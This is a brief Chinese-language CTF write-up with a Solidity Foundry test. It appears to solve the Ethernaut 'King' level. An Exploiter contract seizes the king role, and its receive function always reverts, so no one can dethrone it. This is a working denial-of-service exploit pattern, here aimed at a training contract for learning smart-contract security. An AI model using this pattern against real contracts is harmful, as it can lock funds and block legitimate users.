当向合约地址转账时会调用 `receive` 函数，使用合约地址获取 king 并拒绝接受向该合约转账即可。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/King.sol";
import "src/levels/KingFactory.sol";

contract TestKing is BaseTest {
    King private level;

    constructor() public {
        levelFactory = new KingFactory();
    }

    function setUp() public override {
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = King(levelAddress);

        assertEq(level._king(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player);

        new Exploiter{value: level.prize() + 1}(address(level));

        vm.stopPrank();
    }
}

contract Exploiter {
    constructor(address to) public payable {
        (bool success, ) = address(to).call{value: msg.value}("");
    }
    receive() external payable {
        require(false, "Not call receive");
    }
}
```

